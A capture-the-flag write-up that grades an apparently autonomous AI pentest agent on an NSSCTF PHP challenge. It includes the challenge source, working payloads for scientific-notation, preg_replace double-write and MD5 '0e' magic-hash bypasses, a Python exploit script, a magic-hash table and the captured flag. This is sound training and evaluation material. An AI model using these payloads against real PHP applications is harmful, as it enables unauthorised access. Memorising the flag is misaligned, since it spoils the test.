# 👻 War Story #002 — NSSCTF PHP Weak Comparison + preg_replace Double-Write + MD5 Weak Comparison

## Metadata

| Field | Value |
|------|------|
| **Date** | 2026-04-19 |
| **Target** | `http://node5.anna.nssctf.cn:29058/` |
| **Challenge Type** | Web — PHP Weak Comparison / preg_replace Double-Write Bypass / MD5 Weak Comparison Collision |
| **Keywords** | PHP, weak comparison, array bypass, double-write bypass, MD5 0e collision, scientific notation |
| **Specter Rounds** | 61 (approx. 52 effective, including 9 redundant verification rounds) |
| **MCP Tools** | fetch, python_execute |
| **Correct Flag** | `NSSCTF{4dd0e8c8-d64c-4fe9-90a7-6944df79a1f2}` |

---

## Attack Chain (Complete Real Flow)

| Step | Action | Finding / Issue |
|------|------|-----------|
| 1 | First autonomous pentest launch | **Tool call argument error** — Round 2 failed with 400 due to malformed function arguments JSON |
| 2 | Restarted | fetch retrieved `highlight_file` source, but HTML syntax-highlighting tags made reading difficult |
| 3 | Initial source analysis | Identified three-level structure: L1 (num weak comparison) / L2 (str preg_replace) / L3 (md5 weak comparison) |
| 4 | Attempted L1: `num=1e9` | ✅ Correct! Scientific notation bypasses strlen≤3 + numeric value >999999999 |
| 5 | Attempted L2: `str=NSSNSSCTFCTF` | ✅ Double-write bypass! The P0 fix applied earlier — double-write bypass knowledge was immediately usable |
| 6 | Analyzed L3 condition | `md5(md5_1)==md5(md5_2)` — requires MD5 weak comparison collision |
| 7–9 | **Repeated MD5 collision searches** | Confused search direction: first looked for "double MD5 collision" → then "0e-prefix collision" → brute force → multiple timeouts |
| 10 | Brute-forced 0e-prefix md5 with python_execute | Found `100523`/`100662` etc., but md5 values contained non-digit characters (e.g. `0e993d...`) |
| 11 | Sent L3: `md5_1=100523&md5_2=100662` | ❌ Returned `G100523\n100662` — **md5 comparison failed!** |
| 12 | Diagnosed failure | md5 values like `0e993dffb...` contain letters `d`/`f` — PHP does not treat them as scientific notation |
| 13–20 | **Continued searching for correct collision values** | Tried web search, Python brute force, known collision pairs — multiple timeouts / no results |
| 21–24 | Tried PHP array bypass for L3 | `md5_1[]=1&md5_2[]=2` — `md5([])` returns NULL → `Nice!X(` — is_string check failed |
| 25–33 | **Kept searching for usable string collisions** | Expanded search scope, still couldn't find pure `0e[0-9]+` format md5 collision |
| 34 | Built full request with python_execute | `Nice!yoxi!` appeared simultaneously — confirmed md5 collision values valid, but session management was flawed |
| 35–40 | **Session management confusion phase** | Tried requests.Session / step-by-step requests / single request — repeated flag verification attempts |
| 41 | Found correct collision values | `QNKCDZO` (md5=0e830400...) and `s878926199a` (md5=0e545993...) — **pure 0e+digits format** |
| 42–48 | Constructed full request and verified | Used Python session to properly manage cookies, successfully obtained flag |
| 49–61 | **Repeated verification phase** | Sent requests multiple times to confirm flag — 9 redundant verification rounds |

---

## Source Code Analysis

### Complete Source

```php
<?php
session_start();
highlight_file(__FILE__);
if(isset($_GET['num'])){
    if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){
        echo ":D";
        $_SESSION['L1'] = 1;
    }else{ echo ":C"; }
}
if(isset($_GET['str'])){
    $str = preg_replace('/NSSCTF/',"",$_GET['str']);
    if($str === "NSSCTF"){
        echo "wow";
        $_SESSION['L2'] = 1;
    }else{ echo $str; }
}
if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
    if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){
        echo "Nice!";
        if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){
            if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){
                echo "yoxi!";
                $_SESSION['L3'] = 1;
            }else{ echo "X("; }
        }
    }else{ echo "G"; }
}
if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){
    include('flag.php');
    echo $flag;
}
?>
```

### Three-Level Analysis

| Level | Parameter | Condition | Bypass Method | Success Marker |
|------|------|------|----------|----------|
| L1 | `num` (GET) | `strlen(num)<=3 && num>999999999` | Scientific notation `1e9` | `:D` |
| L2 | `str` (GET) | `preg_replace('/NSSCTF/','',str)==="NSSCTF"` | Double-write `NSSNSSCTFCTF` | `wow` |
| L3 | `md5_1/md5_2` (POST) | `md5_1!==md5_2 && md5(md5_1)==md5(md5_2) && is_string` | 0e-prefix MD5 collision | `Nice!yoxi!` |
| Flag | — | All `L1 && L2 && L3` session values set | — | `NSSCTF{...}` |

---

## Correct Payload and Explanation

### Complete Request

```python
import requests
s = requests.Session()

# Step 1: Set L1 + L2 session
r1 = s.get("http://target/?num=1e9&str=NSSNSSCTFCTF")
# r1.text contains ":Dwow"

# Step 2: Trigger L3 + get flag
r2 = s.post("http://target/", data={"md5_1": "QNKCDZO", "md5_2": "s878926199a"})
# r2.text contains "Nice!yoxi!" + flag
```

### L1: Scientific Notation Bypass

```
GET ?num=1e9
```

- `strlen("1e9")` = 3 (string length) ≤ 3 ✅
- `"1e9" > 999999999` → PHP converts `"1e9"` to `1000000000` > `999999999` ✅

### L2: preg_replace Double-Write Bypass

```
GET ?str=NSSNSSCTFCTF
```

- `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → removes the middle `NSSCTF` → `NSS` + `CTF` = `NSSCTF`
- `'NSSCTF' === 'NSSCTF'` ✅

### L3: MD5 Weak Comparison Collision

```
POST md5_1=QNKCDZO&md5_2=s878926199a
```

- `md5("QNKCDZO")` = `0e830400451993494058024219903391`
- `md5("s878926199a")` = `0e545993274517709034328855841020`
- PHP weak comparison `"0e830400..." == "0e545993..."` → both treated as scientific notation `0` → `0 == 0` = `true` ✅
- `"QNKCDZO" !== "s878926199a"` ✅
- `is_string("QNKCDZO") && is_string("s878926199a")` ✅

### ⚠️ Critical Trap in L3: Only Digits May Follow 0e

- ❌ `100523` → md5 = `0e993dffb88165eb32369e16dd25b536` → contains letters `d`/`f` → PHP does not treat as scientific notation → **weak comparison fails**
- ✅ `QNKCDZO` → md5 = `0e830400451993494058024219903391` → only digits after `0e` → PHP treats as scientific notation 0 → **weak comparison succeeds**

---

## Specter Process Analysis

### Efficiency: Only ~15 of 61 Rounds Were Effective

| Issue Type | Wasted Rounds | Root Cause |
|----------|----------|------|
| Tool call argument format error | 1 | MCP tool call argument JSON format problem |
| Wrong MD5 collision search direction | ~12 | First searched "double MD5" → then "brute force collision" → repeated timeouts |
| Misunderstood 0e collision format | ~5 | Did not know digits-only rule after `0e`; used md5 values containing letters |
| Session management confusion | ~8 | Did not understand step-by-step requests needed to preserve cookies |
| Redundant verification | ~9 | Sent 9 extra requests after obtaining flag to re-confirm |
| **Effective rounds** | **~15** | With complete knowledge and correct session handling, 5–8 rounds would suffice |

### Specific Issue List

#### 1. Inaccurate MD5 Weak Comparison Knowledge (Biggest Waste)

Specter knew "0e-prefix md5 values are weakly equal," but did not know that **only digits (0–9) may follow `0e`** for PHP to treat the value as scientific notation.

- Used `100523` (md5 = `0e993d...`, contains letters d/f) → PHP does not treat as scientific notation → weak comparison fails
- Wasted 5+ rounds on incorrect collision values

**Recommended fix**: Explicitly state in php-bypass-cheatsheet.md and WAF_BYPASS_KNOWLEDGE that only digits may follow `0e`.

#### 2. Inefficient Collision Value Search Strategy

Confused search path:
1. First searched "double MD5 collision" (misread condition as `md5(md5(x))==md5(md5(y))`) → incorrect understanding
2. Brute-forced random numbers → found md5 values containing letters
3. Web search → timeouts

**Correct approach**: The challenge condition is `md5(x) == md5(y)` (weak comparison), not double MD5. Should directly use known classic collision strings `QNKCDZO`/`240610708`/`s878926199a` etc.

**Recommended fix**: Add a "MD5 Weak Comparison Standard Collision String Table" (with verified values) to ctf-web SKILL.md.

#### 3. Poor Session Management Awareness

- Challenge uses `$_SESSION` to store L1/L2/L3 state → cookies must be preserved
- Specter tried sending all parameters in a single request → sometimes worked, sometimes did not
- Many rounds wasted debugging "why didn't the flag appear"

**Recommended fix**: When code review encounters `$_SESSION`, automatically remind that session management (cookie persistence) is required.

#### 4. Excessive Redundant Verification

Sent 9 extra requests after obtaining the flag. Verification is good practice, but 1–2 confirmations are sufficient.

**Recommended fix**: After successful flag verification, confirm at most once more, then immediately [DONE].

---

## Comparison with #001: P0 Fix Effectiveness

| Fix Item | #001 Behavior | #002 Behavior | Result |
|--------|-----------|-----------|------|
| **P0-1: Double-write bypass** | Completely unaware | **Immediately applied** `NSSNSSCTFCTF` | ✅ Fix effective |
| **P0-2: Output semantics** | Misread else echo as success | Correctly identified `:D`/`wow`/`Nice!yoxi!` as success markers | ✅ Fix effective |
| New exposed issue | — | Inaccurate understanding of MD5 0e format | ❌ Needs fix |
| New exposed issue | — | Missing session management knowledge | ❌ Needs fix |

---

## Lessons Learned

### Core Methodology

1. **Scientific notation is the universal key for PHP weak comparison bypass** — formats like `1e9`/`9e9` simultaneously satisfy short string length and large numeric value
2. **preg_replace double-write bypass** — `first-half-of-keyword + keyword + second-half-of-keyword`, after replacement the original keyword is reconstructed
3. **MD5 weak comparison** — md5 values starting with `0e` followed by only digits are treated by PHP as scientific notation 0, making them equal under weak comparison
4. **⚠️ Only digits may follow 0e** — `0e830400...` (all digits ✅) vs `0e993d...` (contains letters ❌)
5. **Session-based challenges require cookie management** — PHP `$_SESSION` depends on cookies; step-by-step requests are required

### Verified MD5 Weak Comparison Collision String Table

| String | MD5 Value | Digits-only after 0e? |
|--------|--------|------------|
| `QNKCDZO` | `0e830400451993494058024219903391` | ✅ |
| `240610708` | `0e462097431906509019562988736854` | ✅ |
| `s878926199a` | `0e545993274517709034328855841020` | ✅ |
| `s155964671a` | `0e342768416822451524974117254469` | ✅ |
| `s214587387a` | `0e848204310308006290363795692068` | ✅ |
| `s1091221200a` | `0e940625744785414655937625828514` | ✅ |

### Specter Capability Assessment

| Capability | Performance | Rating |
|------|------|------|
| Target reconnaissance | Quickly obtained source, identified three-level structure | ⭐⭐⭐⭐ |
| L1 weak comparison bypass | Scientific notation `1e9`, passed in 1 round | ⭐⭐⭐⭐⭐ |
| L2 double-write bypass | Applied immediately after P0 fix | ⭐⭐⭐⭐⭐ |
| L3 MD5 collision | Confused search direction, inaccurate 0e format understanding | ⭐⭐ |
| Session management | Wasted many rounds, did not recognize cookie persistence requirement | ⭐⭐ |
| Flag verification | Excessive verification, 9 redundant rounds | ⭐⭐⭐ |

---

## Issues to Fix

| Priority | Issue | Recommended Fix |
|--------|------|----------|
| **P0** | Inaccurate MD5 0e weak comparison format understanding | php-bypass-cheatsheet.md + WAF_BYPASS_KNOWLEDGE: explicitly state only digits allowed after `0e` |
| **P0** | Missing MD5 weak comparison standard collision string table | Add verified collision table to ctf-web SKILL.md |
| **P1** | Missing session management knowledge | Auto-remind cookie management when code review encounters `$_SESSION` |
| **P2** | Excessive flag verification | Maximum 1 extra confirmation after successful verification, then immediately [DONE] |

---

*Specter Battle #2 · 2026-04-19 · 61 autonomous pentest rounds (~15 effective) · Double-write bypass fix effective · MD5 collision search inefficient 👻*
